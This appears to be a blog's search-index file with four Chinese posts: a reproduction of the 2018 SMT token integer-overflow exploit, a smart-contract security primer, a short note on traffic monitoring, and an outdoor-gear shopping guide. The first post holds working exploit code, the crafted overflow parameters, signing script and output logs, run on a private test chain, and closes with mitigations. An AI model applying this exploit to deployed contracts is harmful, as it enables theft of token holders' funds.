<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[【区块链回归技术】 eth智能合约安全整形溢出漏洞]]></title>
    <url>%2F2018%2F07%2F09%2Feth%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[原理eth智能合约整数溢出漏洞, 原理是uint256类型当取最大整数值，上溢之后直接回绕返回值为0 ， 当取0下溢之后直接回绕，返回值为 2^256-1，这是 solidity中整数溢出场景的常规情况。智能合约可参看https://github.com/jige003/blockchainsec/blob/master/eth/overflow_vul/overflow.sol 回顾 smt 整数溢出漏洞合约代码 https://github.com/jige003/blockchainsec/blob/master/eth/overflow_vul/smtvul.sol1234567891011121314151617181920212223242526272829303132/* * Proxy transfer SmartMesh token. When some users of the ethereum account has no ether, * he or she can authorize the agent for broadcast transactions, and agents may charge agency fees * @param _from * @param _to * @param _value * @param feeSmt * @param _v * @param _r * @param _s */ function transferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt, uint8 _v,bytes32 _r, bytes32 _s) public transferAllowed(_from) returns (bool)&#123; if(balances[_from] &lt; _feeSmt + _value) revert(); // 此处存在上溢的漏洞， 构造_feeSmt 、 _value 可以绕过 uint256 nonce = nonces[_from]; bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce); if(_from != ecrecover(h,_v,_r,_s)) revert(); if(balances[_to] + _value &lt; balances[_to] || balances[msg.sender] + _feeSmt &lt; balances[msg.sender]) revert(); balances[_to] += _value; Transfer(_from, _to, _value); balances[msg.sender] += _feeSmt; Transfer(_from, msg.sender, _feeSmt); balances[_from] -= _value + _feeSmt; nonces[_from] = nonce + 1; return true; &#125; exp smt上溢漏洞查看存在漏洞的函数transferProxy 还需要对转账人对这笔交易执行签名， 校验签名的代码如下123uint256 nonce = nonces[_from]; // 获取随机数bytes32 h = keccak256(_from,_to,_value,_feeSmt,nonce); // 交易消息摘要生成if(_from != ecrecover(h,_v,_r,_s)) revert(); //使用ecrecover 校验签名是否属于转账人 使用ganache-cli 搭建eth私链并部署合约， 并使用web3 部署合约， 可参考此脚本 https://github.com/jige003/blockchainsec/blob/master/eth/overflow_vul/deploy.js， 部署合约后需要记下合约地址 _value和_feeSmt参数直接复制黑客攻击成功的，参考tx链接https://etherscan.io/tx/0x1abab4c8db9a30e703114528e31dee129a3a758f7f8abc3b6494aad3d304e43f设置_value 为0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff设置_feeSmt 为0x7000000000000000000000000000000000000000000000000000000000000001 使用web3和ethereumjs-util的web3.utils.soliditySha3 消息摘要函数、 ethereumjs-util.ecsign 签名函数生成剩余的参数， 代码如下1234567891011121314151617var from = &quot;0x4a886b8a93b07794275fb5b5eaf18e49f7b2c24b&quot;;console.log(&quot;address: &quot; + from);var value = &quot;0x8fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff&quot;;console.log(&quot;value: &quot; + value);var fee = &quot;0x7000000000000000000000000000000000000000000000000000000000000001&quot;;console.log(&quot;fee: &quot; + fee);var hash = web3.utils.soliditySha3(from, from, value, fee, 0);console.log(&quot;Tx hash: &quot; + hash);var prikey = &quot;0xce0ed217ee599c46a3a850cbaccfbff749771cfccb4577cc943bc9bbed703b3c&quot;;var sig = ethUtils.ecsign(ethUtils.toBuffer(hash), ethUtils.toBuffer(prikey));var r = &quot;0x&quot; + sig.r.toString(&apos;hex&apos;);var s = &quot;0x&quot; + sig.s.toString(&apos;hex&apos;);var v = sig.v;console.log(&quot;v: &quot; + v);console.log(&quot;r: &quot; + r);console.log(&quot;s: &quot; + s); 最后调用合约的transferProxy函数exp此合约， exp之前账户地址为0， exp后65133050195990359925758679067386948167464366374422817272194891004451135422463123456789contract.methods.balanceOf(from).call().then(function( result)&#123; console.log(&quot;before exp the addr &quot; + from + &quot; has &quot; + result + &quot; token&quot;);&#125;);contract.methods.transferProxy(from , from, value, fee, v, r, s).send(&#123;from: faddr, gasPrice: 72, gas: 209255&#125;);contract.methods.balanceOf(from).call().then(function( result)&#123; console.log(&quot;after exp the addr &quot; + from + &quot; has &quot; + result + &quot; token&quot;);&#125;); exp log 如下123456789address: 0x4a886b8a93b07794275fb5b5eaf18e49f7b2c24bvalue: 0x8ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffee: 0x7000000000000000000000000000000000000000000000000000000000000001Tx hash: 0xd6b72019dc1b6daf2eb80e22333098028fc5f3d6c8be43e41e86c9bfbc36ecabv: 28r: 0x98ea373fb39f352e6a0337e41f8b8f90a0b6197241e3479c5098c9901c3c9dc3s: 0x16870e9632e8a22f72f37a3ae36a45851e725d02d927f92bd499022d9a0ce4a9before exp the addr 0x4a886b8a93b07794275fb5b5eaf18e49f7b2c24b has 0 tokenafter exp the addr 0x4a886b8a93b07794275fb5b5eaf18e49f7b2c24b has 65133050195990359925758679067386948167464366374422817272194891004451135422463 token 完整的exp测试代码链接https://github.com/jige003/blockchainsec/blob/master/eth/overflow_vul/expvul.js 漏洞防范 使用safemath 库执行基本运算 使用assert、 require执行校验** 代码review 参考链接https://ethereumdev.io/safemath-protect-overflows/https://web3js.readthedocs.io/en/1.0/getting-started.htmlhttp://www.freebuf.com/vuls/169741.htmlhttps://medium.com/loom-network/how-to-secure-your-smart-contracts-6-solidity-vulnerabilities-and-how-to-avoid-them-part-1-c33048d4d17dhttps://github.com/ethereum/solidity/issues/796#issuecomment-253578925]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>智能合约安全</tag>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【区块链回归技术】 eth智能合约安全介绍]]></title>
    <url>%2F2018%2F07%2F05%2Feth%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E4%BB%8B%E7%BB%8D%2F</url>
    <content type="text"><![CDATA[开发智能合约需要一个全新思维， 不同于以往的项目开发， 需要对区块链的基本概念至少有一个基本的认知。由于其不可篡改性， 区块链的犯错成本往往是巨大的， 并且很难通过迭代修复。 随着大家对区块链研究越来越深入、 了解越来越透彻， 智能合约语言的bug及项目复杂性带来的安全漏洞也逐渐抛出水面， 面临的安全形势也变得千变万化。 0x01 安全思维转变对于区块链安全了解认知不够的， 需要明确下思维的转变： 合约漏洞修复无法通过升级部署来完成， 只能重新部署一个新的合约智能合约是编译后部署到区块链， 编译合约可以得到bytecode 或者runtime bytecode，部署到链上会得到一个合约地址， 合约地址与账户地址格式一样是公钥， 区分合约地址与账户地址可以通过接口获取code， 其中账户地址返回的都是0x0； 当代码变更重新执行部署实际上会返回一个新的合约地址， 存储的是不一样的runtime bytecode。bytecode 包含构造函数、 初始化代码及runtime bytecode；runtime bytecode 是实际存储在合约地址上的字节码。 合约函数访问权限特性需要明确合约函数默认是public权限， 传统项目开发一般不会造成什么安全问题。 由于区块链是去中心化的， 部署的合约是公开的， 也意味着任何人可以调用public权限接口，这样就可能导致恶意调用造成的安全漏洞。 清楚gas的花费以及区块的gas limit以太坊的evm是基于gas消耗执行的， 链上存储数据、 修改数据都是要消耗gas的， 而gas是由eth转换提供的。 因此不合理的代码会造成高额的花费， 对于恶意的调用也可能造成类似ddos的攻击， 无限消耗的你花费； 必须谨慎使用没有固定迭代次数的循环， 特别是依赖于storage的， 由于storage是把数据存储在链上，每次操作都会消耗gas， 特别这里有一个坑是solidity默认类型就是storage而不是memory， 因此必须特别清醒意识到哪些数据是有必要存储到链上的， 非必要的需要明确声明为memory。 区块链没有私有数据在智能合约中你所用的一切都是公开可见的，即便是局部变量和被标记成private的状态变量也是如此。 如果不想让矿工作弊的话，在智能合约中使用随机数会很棘手 ， 在智能合约中使用随机数很难保证节点不作弊， 这是因为智能合约中的随机数一般要依赖计算节点的本地时间得到， 而本地时间是可以被恶意节点伪造的，因此这种方法并不安全。 通行的做法是采用链外的第三方服务，比如 Oraclize 来获取随机数。 0x02 一些开发tips认真对待警告如果编译器警告了你什么事，你最好修改一下，即使你不认为这个特定的警告不会产生安全隐患，因为那也有可能埋藏着其他的问题。 我们给出的任何编译器警告，都可以通过轻微的修改来去掉。 同时也请尽早添加 pragma experimental “v0.5.0”; 来允许 0.5.0 版本的安全特性。 注意在这种情况下，experimental 并不意味着任何有风险的安全特性， 它只是可以允许一些在当前版本还不支持的 Solidity 特性，来提供向后的兼容。 限定eth的数量限定storage 在一个智能合约中 eth（或者其它通证）的数量。 如果你的源代码、编译器或者平台出现了 bug，可能会导致这些资产丢失。 如果你想控制你的损失，就要限定eth的数量。 使用“检查-生效-交互”（Checks-Effects-Interactions）模式大多数函数会首先做一些检查工作（例如谁调用了函数，参数是否在取值范围之内，它们是否发送了足够的 eth ，用户是否具有通证等等）。 这些检查工作应该首先被完成。 第二步，如果所有检查都通过了，应该接着进行会影响当前合约状态变量的那些处理。 与其它合约的交互应该是任何函数的最后一步。 早期合约延迟了一些效果的产生，为了等待外部函数调用以非错误状态返回。 由于上文所述的重入问题，这通常会导致严重的后果。 请注意，对已知合约的调用反过来也可能导致对未知合约的调用，所以最好是一直保持使用这个模式编写代码。 包含故障-安全（Fail-Safe）模式尽管将系统完全去中心化可以省去许多中间环节，但包含某种故障-安全模式仍然是好的做法，尤其是对于新的代码来说： 你可以在你的智能合约中增加一个函数实现某种程度上的自检查，比如“ eth是否会泄露？”， “通证的总和是否与合约的余额相等？”等等。 请记住，你不能使用太多的 gas，所以可能需要通过 eth计算来辅助。 如果自检查没有通过，合约就会自动切换到某种“故障安全”模式， 例如，关闭大部分功能，将控制权交给某个固定的可信第三方，或者将合约转换成一个简单的“退回我的钱”合约。 形式化验证使用形式化验证可以执行自动化的数学证明，保证源代码符合特定的正式规范。 规范仍然是正式的（就像源代码一样），但通常要简单得多。 请注意形式化验证本身只能帮助你理解你做的（规范）和你怎么做（实际的实现）的之间的差别。 你仍然需要检查这个规范是否是想要的，而且没有漏掉由它产生的任何非计划内的效果。 基本权衡：简单性与复杂性在评估一个智能合约的架构和安全性时有很多需要权衡的地方。对任何智能合约的建议是在各个权衡点中找到一个平衡点。 从传统软件工程的角度出发：一个理想的智能合约首先需要模块化，能够重用代码而不是重复编写，并且支持组件升级。从智能合约安全架构的角度出发同样如此，模块化和重用被严格审查检验过的合约是最佳策略，特别是在复杂智能合约系统里。 然而，这里有几个重要的例外，它们从合约安全和传统软件工程两个角度考虑，所得到的重要性排序可能不同。当中每一条，都需要针对智能合约系统的特点找到最优的组合方式来达到平衡。 固化 vs 可升级 庞大 vs 模块化 重复 vs 可重用 固化 vs 可升级 在很多文档或者开发指南中，包括该指南，都会强调延展性比如：可终止，可升级或可更改的特性，不过对于智能合约来说，延展性和安全之间是个基本权衡。 延展性会增加程序复杂性和潜在的攻击面。对于那些只在特定的时间段内提供有限的功能的智能合约，简单性比复杂性显得更加高效，比如无管治功能，有限短期内使用的代币发行的智能合约系统(governance-fee,finite-time-frame token-sale contracts)。 庞大 vs 模块化一个庞大的独立的智能合约把所有的变量和模块都放到一个合约中。尽管只有少数几个大家熟知的智能合约系统真的做到了大体量，但在将数据和流程都放到一个合约中还是享有部分优点–比如，提高代码审核(code review)效率。 和在这里讨论的其他权衡点一样，传统软件开发策略和从合约安全角度出发考虑，两者不同主要在对于简单、短生命周期的智能合约；对于更复杂、长生命周期的智能合约，两者策略理念基本相同。 重复 vs 可重用从软件工程角度看，智能合约系统希望在合理的情况下最大程度地实现重用。 在Solidity中重用合约代码有很多方法。 使用你拥有的以前部署的经过验证的智能合约是实现代码重用的最安全的方式。 在以前所拥有已部署智能合约不可重用时重复还是很需要的。 现在Live Libs 和Zeppelin Solidity 正寻求提供安全的智能合约组件使其能够被重用而不需要每次都重新编写。任何合约安全性分析都必须标明重用代码，特别是以前没有建立与目标智能合同系统中处于风险中的资金相称的信任级别的代码。]]></content>
      <categories>
        <category>blockchain</category>
      </categories>
      <tags>
        <tag>智能合约安全</tag>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[扯扯流量问题]]></title>
    <url>%2F2017%2F06%2F09%2F%E6%89%AF%E6%89%AF%E6%B5%81%E9%87%8F%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[公司由于行业关系，数据和流量是一个特别总要的事， 不同于一般的互联网公司，流量可能只是做提取REQUEST包做漏洞的自动化检测， 而我们tm的还要精确到具体IP、 端口的流量使用情况。 so 根据实际情况还添置了流控设备， 可以设备也未能如愿， 只能查看SRC IP的端口]]></content>
      <categories>
        <category>安全开发</category>
      </categories>
      <tags>
        <tag>流量</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[户外海淘入坑]]></title>
    <url>%2F2017%2F06%2F06%2F%E6%88%B7%E5%A4%96%E6%B5%B7%E6%B7%98%E5%85%A5%E5%9D%91%2F</url>
    <content type="text"><![CDATA[最近小伙伴们开上走上了装备党的路线，装备越来越好， 路线越来越休闲了。 为了跟上组织的步伐， 我也开上瞄上了装备， 只希望做一个合格的党员。 研究了近一月有感， 果然tm 有钱可能方便的解决很多事情。 鸟像鸟像， 感觉是一个牌坊， 想上可惜囊中羞射。 只能发挥自己的特长， 系统的学习装备党应该了解的技能，从内到外， 从外到内。 当然这只是初衷， 现在觉得丰富内在就好了， 外在已经不重要了， 感觉自己已经够帅了，实用， 物美价廉才是我等屌丝应该追求的极致。 如何优雅的入坑俗话说， 头可断， 血可流， 发型不能乱， 从中感悟颇多， 任何时候优雅都是一件很重要的事情。 理论入坑户外常有三层之说， 感觉像诛仙里面的天书总纲， 天地不仁，以万物为刍狗… 这是可以贯穿一年四季的强大之基本所在。 三层指 排汗层、 保暖层、 防风层。 排汗层排汗层主要是指各类排汗内衣裤。排汗内衣裤最主要的作用是将人体所分泌的汗液以最快的速度分散开，并且从面料内层导向面料外层，以较快的速度在运动过程中将汗液尽量蒸发掉。这在冬季户外活动中是非常重要的，如果衣物内层的汗液不能尽快蒸发掉，在运动过后静止时留存的汗液会造成严重的热量散失，后果非常严重。 保暖层以厚抓绒衣裤、化纤棉衣裤、羽绒衣裤为主。在运动过程中，除非是极寒气候，更为推荐穿着厚抓绒衣裤或化纤棉衣裤。因为如果在运动过程中穿着为羽绒衣裤，人体分泌的汗液有可能会渗入到羽绒中使羽绒变潮，保温性能急速下降且不易干燥，而抓绒、化纤棉衣裤在潮湿情况下保温性的丧失却没有羽绒这么明显，潮湿后干燥的速度也更快。带一套保温性能良好的羽绒衣裤在营地时候穿着是非常必要的。 防风层主要指各类硬壳、软壳衣裤。1) 如果会遭遇雨雪气候，还是应以硬壳为主，硬壳主要作用为防水、防风、透气。在冬季低温环境下，通常会伴随着猛烈的寒风，造成非常明显的风冷效应。在同样环境温度下，风冷效应会使人体体感下降10摄氏度有余。目前世界上以PTFE为基础的面料主要由GORE-TEX、EVENT、DRY-QElite、DENTIK四种面料组成，其中以GORE-TEX系列最为著名。GORE公司为了满足用户在各类环境、各类运动条件下的不同使用需求，将GORE-TEX面料细分研发出多种不同性能侧重的子型号产品，适用范围广，性能优越，全球市场占有率最大。PTFE类面料的优点是透气性能更佳且低温性能稳定，不会因低温造成面料透气性降低或面料性质改变。2) 如在无雨雪气候或雨雪量不大的情况下也可以选择软壳产品。软壳相对于硬壳而言面料要柔软许多，有着更好的面料延展性、透气性，穿着舒适性更佳。但是通常来说同品牌、同码数的软壳相比硬壳而言版型要更为收身，对所能容纳的中层保温层的厚度有所限制，所能应对的环境温度不宜过低，这点要特别注意。从技术上讲，软壳基本分为织物防风及膜防风两种，两种防风技术各有优势，织物防风软壳透气性更佳，膜防风软壳防风性能更佳。对冬季低温环境下使用还是更加推荐膜防风软壳，以采用GORE Windstopper防风透气膜面料的膜防风软壳为上选。一年四季气候多变，不考虑海拔等特殊情况大致可以对应春 ==》 排汗层、 防风层夏 ==》 排汗层秋 ==》 排汗层、 防风层冬 ==》 排汗层、 保暖层、 防风层 品牌入坑户外品牌特别多，8264 上有所有的户外品牌的评分， 感觉没啥卵用， 一般来说出名的品牌总有辣么几个一炮打响的产品。 最初不太了解的时候看各大装备牛的姿势， 感觉似乎都是一层不变的， 总在说辣么几个牌子的某件产品， 附上了链接方便了拿手党。 自己研究了过后觉得只能说又可取之处， 毕竟发现好多都是几年前的了， 各家都对相关的已有升级， 但并有看到相关的文章，so先排下很多文章都会提到的装备坑。 土拨鼠神衣其实就是类似于皮肤衣，防晒防风透气。看国外评测也确实排名特别高，主要是marmot用到了一个自制的材料叫Driclime，看了下介绍，没大看懂，但也明白了，反正很NB久对了。到今年神衣其实已经出了4款了 老款经典款Driclime Windshirt 货号91680，专柜售价899元 带帽升级款 Ether Driclime Hoody 货号51930，专柜售价1499元 无帽新款升级款 Ether Driclime Jacket 货号52460 专柜售价1399元 带帽当季新升级款 Ether Driclime Hoody 52430，专柜售价1599元91680是经典版型，经过多年考验，是获得“神衣”名号的原生款式，本款价格也最实惠。51930和52430都是新设计款式，版型相同，但是52340在面料上更进行了改进，外层面料相比51930更轻薄。 两者的内部绒的厚度都要比经典老款51680更好。 巴塔的C1-C4Patagonia旗下的Capilene系列内衣是patagonia畅销多年的经典系列，Capilene是一种吸湿的涤纶面料，可以保暖，即使是在潮湿的情况下，也会迅速快干。它也是一种可以回收的面料，可以循环再利用，自身带有Gladiodor生物除臭技术。 是高排汗量运动和潮湿环境下的最佳选择，位居全美销量第一！针对四种不同的活动强度和温度，Patagonia生产四种不同的Capilene面料1-4。 Capilene 1 ：非常轻，有丝绸的质感，可以单独穿或者作为内衣穿。 Capilene 2 ：适合寒冷天气进行有氧运动时穿着。 Capilene 3 ：寒冷季节最好的内衣。 Capilene 4 ：专门为最寒冷的环境设计。其实到今年已经对C系列进行了更新 C1 ==》Capilene Lightweight C2 ==》Capilene Midweight C3 ==》Capilene Heavyweight C4 ==》Capilene ThermalWeight 持续更新中 海淘入坑算上入正题了吧，海淘，有好处也有坏处。好处大致有3点：1）种类齐全而且更新快2）有正品保障3）价格会优惠许多不好的地方就是由于国人身材和外国佬的会有些区别，衣服尺码可能和国内的对不上的情况，so需要量好3围，竟可能的选着适合自己的。再tm不好的地方就是由于国外的东西寄回国内流程会复杂一些，等待到货的时间会比较久一点。 海淘户外网址推荐 www.backcountry.com 俗称BC，东西很齐全，很多东西折扣也很NICE，满50刀包邮走UPS，速度还是蛮不错的 www.steepandcheap.com BC的折扣品，里面大多都是BC缺码处理的，折扣力度很nice，不包邮 www.rei.com 基本可以参照BC www.sierratradingpost.com 论坛里说里面折扣不错，不过没有发现，感觉一般，俗称stp 转运可以参照下图其中我使用的是海带宝，感觉各方面都还不错。 支付一般采用信用卡或者paypal支付， paypal可以理解为就是国外的支付宝， 也可以绑定信用卡或者借记卡。 笔者支付采用的是paypal，之所以不使用信用卡是因为国外的网站只要记住信用卡号、到期时间及3位PIN码即可支付。 感觉太tm危险了，万一哪个网站做的不好泄露了隐私数据都找不到地方哭去。 整体流程购物的checkout的时候shopping address填写转运地址， billing address主要是账单地址， 感觉没什么卵用。然后到转运公司申报自己的包裹，收到过后会通知你缴费，然后就等着飞回国，清关，再到自己手里了。]]></content>
      <categories>
        <category>户外</category>
      </categories>
      <tags>
        <tag>海淘</tag>
        <tag>户外装备</tag>
      </tags>
  </entry>
</search>